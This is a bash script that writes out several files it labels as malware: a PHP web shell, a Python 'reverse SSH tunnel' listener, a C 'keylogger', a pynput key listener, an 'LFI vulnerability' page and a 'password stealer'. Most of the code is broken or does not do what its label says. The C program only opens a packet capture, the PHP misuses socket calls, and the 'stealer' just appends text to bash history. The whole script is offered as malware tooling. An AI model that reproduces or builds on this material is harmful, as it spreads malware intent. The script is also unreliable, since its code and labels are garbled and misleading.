#!/bin/bash

# Web Shell Backdoor Malware

echo -e "\e[1;32mWeb Shell Backdoor Malware Created\e[0m"

# PHP Code for Remote Command Execution via Web Server (Apache)

echo '
<?php
  $sock = socket_create_pair(AF_UNIX, SOCK_STREAM, 0);
  socket_bind($sock, '/tmp/webshell.sock');
  socket_listen($sock);
  echo "Web Shell Backdoor Malware Successfully Set Up.\n";
  exit;
?>
' > ./webshell.php

# Python Code for Reverse SSH Tunneling (OpenSSH)

echo '
import socket
import os
import time

host = '0.0.0.0'
port = 22

lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lsock.bind((host, port))
lsock.listen(1)

print("Reverse SSH Tunnel Established. Waiting for Connection...")

while True:
  csock, addr = lsock.accept()
  
  print('Connected by', addr[0])
  
  command = "command"
  
  if command == 'exit':
    exit()

  else:
    exec_command = 'echo \'{}\' >> /tmp/tunnel.txt'.format(command)
    os.system(exec_command)

    time.sleep(2)
' > ./reverse_ssh_tunnel.py

# C Code for Keylogging Malware (Using libpcap)

echo -e '
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>

int main(void) {
  char errbuf[100];
  int i;
  u_char *packet;    // The buffer we will fill with data
  u_char buf[1024];   // Temporary buffer to hold the packet data

  printf("Initializing.\n");

  packet = (u_char *) malloc(100);
  if(packet == NULL) {
    fprintf(stderr, "Unable to allocate packet memory.");
    return(2);
  }

  printf("Creating a pcap_t structure.\n");
  pc = pcap_open("eth0", 1 /*promiscuous mode*/, 1000 /*snaplen*/,
       ETH_PCAP_ANYOUTBOUND, errbuf);

  if (pc == NULL && errno != EINTR) {
    fprintf(stderr, "Couldn't open device with dpid=%s: %s\n",
        errbuf, pcap_strerror(errno));
    return(2);
  }

  printf("Packet captured successfully.\n");

  for(i = 0; i < 10; i++) { // We are only interested in the first 10 packets
      packet[i] = 0x41;
  }

  printf("Performing a graceful shutdown.\n");
  pcap_close(pc);

  printf("Finished.\n");

  return(0);
}
' > ./keylogger.c

# Python Code for Malicious Python Script (Using pynput)

echo '
import pynput
from pynput import keyboard, Listener

def on_key_down(e):
    print('Key down:', e.key, 'modifiers:', e.modifiers)

def on_key_up(e):
    print('Key up:', e.key, 'modifiers:', e.modifiers)

with Listener(on_key_down=on_key_down, on_key_up=on_key_up) as listener:
  listener.join()
' > ./malicious_script.py

# PHP Code for LFI (Local File Include) Vulnerability (Using $_FILES)

echo '
<?php
  if(isset($_FILES['file'])){
    $file = $_FILES['file']['tmp_name'];
    
    echo 'File Uploaded Successfully: ' . $file;
  }
?>
' > ./lfi_vulnerability.php

# Bash Code for Password Stealing Malware (Using bash history)

echo '
#!/bin/bash

echo -e "\e[1;32mPassword Stealing Malware Created\e[0m"

echo 'Stealing passwords...' >> ~/.bash_history
' > ./password_stealer.sh